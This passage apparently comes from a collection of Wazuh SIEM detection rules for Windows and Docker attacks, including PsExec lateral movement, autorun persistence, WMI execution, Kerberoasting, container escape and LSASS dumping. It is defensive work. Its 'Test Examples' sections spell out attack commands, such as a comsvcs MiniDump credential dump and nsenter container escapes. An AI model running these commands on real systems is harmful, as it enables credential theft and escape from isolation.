  - Inspect XML file contents for suspicious commands
  - Whitelist authorized deployment tools
  - Monitor for task creation followed by immediate execution
  - Check task triggers (ONLOGON, ONSTART, repeated intervals)
  - Validate task actions against known good patterns
  - Alert on tasks running with SYSTEM privileges
  - Review tasks with unusual time triggers
-->


<!-- SOURCE FILE: wazuh-069-lateral-movement-psexec.xml --><!--
  Wazuh Rule: Lateral Movement via PsExec
  ID: 100069
  Level: 10 (High)
  Description: Detects PsExec service installation and execution for lateral movement
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,lateral_movement,">
  <rule id="100069" level="10">
    <if_sid>60000</if_sid>
    <field name="win.system.eventID">^7045$</field>
    <field name="win.eventdata.serviceName">PSEXESVC</field>
    <description>PsExec service detected - Possible lateral movement</description>
    <mitre>
      <id>T1570</id>
    </mitre>
    <group>psexec,lateral_movement,</group>
  </rule>

  <rule id="100069001" level="12" frequency="3" timeframe="600">
    <if_matched_sid>100069</if_matched_sid>
    <description>Multiple PsExec service installations across hosts - Active lateral movement</description>
    <mitre>
      <id>T1570</id>
    </mitre>
    <group>psexec,lateral_movement,mass_compromise,</group>
  </rule>
</group>

<!--
Summary:
  Detects PSEXESVC service installation (Event 7045) which indicates PsExec remote execution.
  Elevated severity when detected across multiple hosts within 10 minutes.

Fields Used:
  - win.eventdata.serviceName: Service name (PSEXESVC)
  - win.eventdata.imagePath: Service executable path
  - win.system.computer: Target hostname
  - win.eventdata.accountName: Service account

False Positives:
  - Legitimate IT administration using PsExec
  - Authorized remote management tools
  - System deployment activities
  - Troubleshooting and support operations

Severity: High (10), Critical (12 for multiple hosts)

MITRE ATT&CK: T1570 - Lateral Tool Transfer

Log Sources:
  - Windows System Event 7045 (Service Install)
  - Windows Security Event 4697 (Service Install)
  - Sysmon Event ID 1 (for PSEXESVC.exe execution)

Test Examples:
  - psexec \\\\target-host -u admin -p password cmd.exe
  - Service: PSEXESVC installed on remote host
  - Multiple hosts showing PSEXESVC installation in sequence

Tuning Notes:
  - Whitelist authorized IT staff and source IPs
  - Track PsExec usage patterns across environment
  - Correlate with authentication events (4624, 4625)
  - Alert on PsExec from non-admin workstations
  - Monitor for lateral movement chains across network
  - Implement application whitelisting to block unauthorized PsExec
  - Review user accounts performing remote execution
-->


<!-- SOURCE FILE: wazuh-070-registry-autorun-modification.xml --><!--
  Wazuh Rule: Windows Registry Autorun Key Modification
  ID: 100070
  Level: 9 (Medium-High)
  Description: Detects modifications to Windows registry autorun keys for persistence
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,registry,">
  <rule id="100070" level="9">
    <if_sid>60000</if_sid>
    <field name="win.eventdata.targetObject">\\CurrentVersion\\Run\\|\\CurrentVersion\\RunOnce\\|\\Winlogon\\</field>
    <field name="win.system.eventID">^13$</field>
    <description>Registry autorun key modified - Possible persistence mechanism</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
    <group>registry_persistence,autorun,</group>
  </rule>

  <rule id="100070001" level="11">
    <if_sid>100070</if_sid>
    <field name="win.eventdata.details">\\Temp\\|\\AppData\\|\\Users\\Public\\|cmd.exe|powershell.exe</field>
    <description>Suspicious registry autorun key - Points to unusual location or script</description>
    <mitre>
      <id>T1547.001</id>
    </mitre>
    <group>registry_persistence,autorun,suspicious,</group>
  </rule>
</group>

<!--
Summary:
  Monitors Sysmon Event 13 (Registry value set) for modifications to common autorun registry
  locations. Elevated severity when values point to suspicious paths or scripts.

Fields Used:
  - win.eventdata.targetObject: Registry key path
  - win.eventdata.details: Registry value content
  - win.eventdata.image: Process modifying registry
  - win.eventdata.user: User account

False Positives:
  - Software installations and updates
  - Legitimate startup applications
  - System configuration changes
  - User-installed applications

Severity: Medium-High (9), High (11 for suspicious values)

MITRE ATT&CK: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys

Log Sources:
  - Sysmon Event ID 13 (Registry value set)
  - Windows Security Event 4657 (Registry modified)

Test Examples:
  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware = C:\\Temp\\malware.exe
  - HKCU\\..\\Run\\Backdoor = powershell.exe -enc [base64]
  - Winlogon\\Userinit = userinit.exe,C:\\malicious.exe

Tuning Notes:
  - Baseline legitimate startup applications
  - Whitelist known software by process and value
  - Alert on registry modifications from scripting engines
  - Monitor for modifications by non-admin users
  - Check for unusual parent processes making changes
  - Correlate with file creation events
  - Validate executables with digital signatures
  - Regularly audit autorun locations
-->


<!-- SOURCE FILE: wazuh-071-suspicious-wmi-process-creation.xml --><!--
  Wazuh Rule: Suspicious Process Creation via WMI
  ID: 100071
  Level: 10 (High)
  Description: Detects process creation through WMI which may indicate malicious execution
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,wmi,">
  <rule id="100071" level="10">
    <if_sid>60000</if_sid>
    <field name="win.eventdata.parentImage">\\wmiprvse.exe$</field>
    <field name="win.eventdata.image">\\cmd.exe$|\\powershell.exe$|\\wscript.exe$|\\cscript.exe$</field>
    <description>Suspicious process spawned from WMI - Possible remote execution</description>
    <mitre>
      <id>T1047</id>
    </mitre>
    <group>wmi_execution,remote_execution,</group>
  </rule>
</group>

<!--
Summary:
  Detects when WMI provider host (wmiprvse.exe) spawns suspicious child processes like
  cmd.exe, powershell.exe, or scripting engines, indicating WMI-based command execution.

Fields Used:
  - win.eventdata.parentImage: Parent process (wmiprvse.exe)
  - win.eventdata.image: Child process spawned
  - win.eventdata.commandLine: Command line executed
  - win.eventdata.user: User context of execution

False Positives:
  - Legitimate system administration via WMI
  - Configuration management tools
  - Monitoring and management agents
  - Scheduled tasks using WMI

Severity: High (10)

MITRE ATT&CK: T1047 - Windows Management Instrumentation

Log Sources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event 4688
  - WMI-Activity/Operational logs

Test Examples:
  - wmic process call create "cmd.exe /c malware.exe"
  - wmiprvse.exe spawning powershell.exe with encoded command
  - WMI process creation on remote host

Tuning Notes:
  - Whitelist authorized WMI usage by administrators
  - Monitor for WMI from unusual source hosts
  - Correlate with authentication events for remote WMI
  - Alert on WMI usage outside business hours
  - Track command lines for suspicious patterns
  - Implement WMI filtering and hardening
  - Monitor WMI event consumers for persistence
-->


<!-- SOURCE FILE: wazuh-072-kerberoasting-detection.xml --><!--
  Wazuh Rule: Kerberoasting Activity Detected
  ID: 100072
  Level: 11 (High)
  Description: Detects Kerberos TGS ticket requests indicating Kerberoasting attack
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,kerberos,">
  <rule id="100072" level="11" frequency="10" timeframe="60">
    <if_sid>60000</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">0x17</field>
    <same_source_ip />
    <description>Kerberoasting detected - Multiple TGS requests with RC4 encryption</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
    <group>kerberoasting,credential_access,</group>
  </rule>
</group>

<!--
Summary:
  Identifies Kerberoasting by detecting 10+ Kerberos TGS ticket requests (Event 4769)
  using RC4 encryption (0x17) within 60 seconds, indicating bulk service ticket requests.

Fields Used:
  - win.eventdata.serviceName: Service principal name requested
  - win.eventdata.ticketEncryptionType: Encryption type (0x17 = RC4)
  - win.eventdata.ipAddress: Source IP of requests
  - win.eventdata.targetUserName: User account requesting tickets

False Positives:
  - Legitimate service account usage
  - Some legacy applications requiring RC4
  - Service discovery tools
  - Monitoring systems

Severity: High (11)

MITRE ATT&CK: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

Log Sources:
  - Windows Security Event 4769 (Kerberos Service Ticket Request)
  - Domain Controller security logs

Test Examples:
  - Rubeus.exe kerberoast (bulk TGS requests)
  - Invoke-Kerberoast.ps1 PowerShell script
  - GetUserSPNs.py from Impacket
  - Multiple SPN ticket requests in short timeframe

Tuning Notes:
  - Alert on bulk RC4 ticket requests from single user
  - Monitor for requests to high-value service accounts
  - Implement AES encryption for Kerberos
  - Disable RC4 where possible
  - Use managed service accounts (gMSA) with strong passwords
  - Monitor for subsequent offline cracking attempts
  - Investigate requesting user account for compromise
  - Correlate with other credential access indicators
-->


<!-- SOURCE FILE: wazuh-073-suspicious-network-share-access.xml --><!--
  Wazuh Rule: Suspicious Network Share Access
  ID: 100073
  Level: 8 (Medium)
  Description: Detects access to administrative network shares from unusual sources
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,network,shares,">
  <rule id="100073" level="8" frequency="5" timeframe="300">
    <if_sid>60000</if_sid>
    <field name="win.system.eventID">^5140$</field>
    <field name="win.eventdata.shareName">\\\\.*\\ADMIN\$|\\\\.*\\C\$|\\\\.*\\IPC\$</field>
    <same_source_ip />
    <description>Multiple administrative share access attempts - Possible lateral movement</description>
    <mitre>
      <id>T1021.002</id>
    </mitre>
    <group>share_access,lateral_movement,</group>
  </rule>
</group>

<!--
Summary:
  Monitors Windows Event 5140 (Network share accessed) for access to administrative shares
  (ADMIN$, C$, IPC$) with 5+ attempts from same source IP within 5 minutes.

Fields Used:
  - win.eventdata.shareName: Network share name
  - win.eventdata.ipAddress: Source IP accessing share
  - win.eventdata.subjectUserName: User account used
  - win.eventdata.accessMask: Access permissions requested

False Positives:
  - Legitimate administrative access
  - System management tools
  - Backup software
  - Monitoring agents

Severity: Medium (8)

MITRE ATT&CK: T1021.002 - Remote Services: SMB/Windows Admin Shares

Log Sources:
  - Windows Security Event 5140 (Network share accessed)
  - Windows Security Event 5145 (Share access check)

Test Examples:
  - Access to \\\\DC01\\ADMIN$ from workstation
  - Multiple C$ share access attempts
  - IPC$ enumeration for share discovery
  - Administrative share access during off-hours

Tuning Notes:
  - Whitelist authorized jump servers and admin workstations
  - Alert on share access from non-IT user accounts
  - Monitor for failed then successful access patterns
  - Correlate with authentication events
  - Track lateral movement chains across network
  - Implement share access restrictions via GPO
  - Disable unnecessary administrative shares
  - Monitor for file access after share connection
-->


<!-- SOURCE FILE: wazuh-074-container-escape-attempt.xml --><!--
  Wazuh Rule: Docker Container Escape Attempt
  ID: 100074
  Level: 12 (Critical)
  Description: Detects attempts to escape Docker container to host system
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="linux,docker,container,">
  <rule id="100074" level="12">
    <if_sid>530</if_sid>
    <match>docker.*--privileged|--cap-add=SYS_ADMIN|/var/run/docker.sock|nsenter|unshare</match>
    <description>Container escape attempt detected - Privileged container or namespace manipulation</description>
    <mitre>
      <id>T1611</id>
    </mitre>
    <group>container_escape,privilege_escalation,</group>
  </rule>
</group>

<!--
Summary:
  Detects container escape techniques including privileged container creation, Docker socket
  mounting, and namespace manipulation utilities that allow breaking out of containerization.

Fields Used:
  - command: Command executed
  - user: User executing command
  - container_id: Docker container identifier
  - image: Container image name

False Positives:
  - Legitimate privileged container usage
  - Container management tools
  - Development and testing environments
  - Docker-in-Docker scenarios

Severity: Critical (12)

MITRE ATT&CK: T1611 - Escape to Host

Log Sources:
  - Docker daemon logs
  - Auditd logs
  - Container runtime logs
  - System call monitoring

Test Examples:
  - docker run --privileged -it ubuntu /bin/bash
  - docker run -v /var/run/docker.sock:/var/run/docker.sock
  - nsenter --target 1 --mount --uts --ipc --net /bin/bash
  - Mounting host filesystem in container

Tuning Notes:
  - Restrict privileged container creation
  - Disable Docker socket mounting in production
  - Implement container runtime security policies
  - Use user namespaces for isolation
  - Monitor for unusual process activity in containers
  - Implement pod security policies (Kubernetes)
  - Alert on container processes accessing host resources
  - Regularly audit container configurations
-->


<!-- SOURCE FILE: wazuh-075-credential-dumping-comsvcs.xml --><!--
  Wazuh Rule: LSASS Memory Dump via comsvcs.dll
  ID: 100075
  Level: 13 (Critical)
  Description: Detects credential dumping using comsvcs.dll MiniDump technique
  Author: HawkinsOps SOC
  Date: 2025-11-18
-->

<group name="windows,credential_access,">
  <rule id="100075" level="13">
    <if_sid>60000</if_sid>
    <field name="win.eventdata.image">\\rundll32.exe$</field>
    <field name="win.eventdata.commandLine">comsvcs.*MiniDump|comsvcs.*full</field>
    <description>LSASS memory dump detected using comsvcs.dll - Credential theft attempt</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
    <group>credential_dumping,lsass_dump,</group>
  </rule>
</group>

<!--
Summary:
  Detects rundll32.exe calling comsvcs.dll's MiniDump function to dump LSASS process memory,
  a stealthy credential theft technique that bypasses some security controls.

Fields Used:
  - win.eventdata.commandLine: Full command line
  - win.eventdata.image: Process path (rundll32.exe)
  - win.eventdata.user: User context
  - win.eventdata.parentImage: Parent process

False Positives:
  - Extremely rare - this technique is almost exclusively malicious
  - Authorized forensic/IR activities
  - Troubleshooting by Microsoft support

Severity: Critical (13)

MITRE ATT&CK: T1003.001 - OS Credential Dumping: LSASS Memory

Log Sources:
  - Sysmon Event ID 1 (Process Creation)
  - Windows Security Event 4688
  - Sysmon Event ID 10 (Process Access to lsass.exe)

Test Examples:
  - rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 612 C:\\temp\\lsass.dmp full
  - rundll32 comsvcs MiniDump <LSASS_PID> dump.bin full
  - Automated exploitation tools using comsvcs technique

Tuning Notes:
  - Alert immediately and investigate
  - Assume credential compromise if detected
  - Block rundll32 calling comsvcs.dll via ASR rules
  - Enable Credential Guard to protect LSASS
  - Monitor for file creation of dump files
  - Check for subsequent lateral movement
  - Reset passwords for accounts on affected systems
  - Implement LSA protection (RunAsPPL)
-->


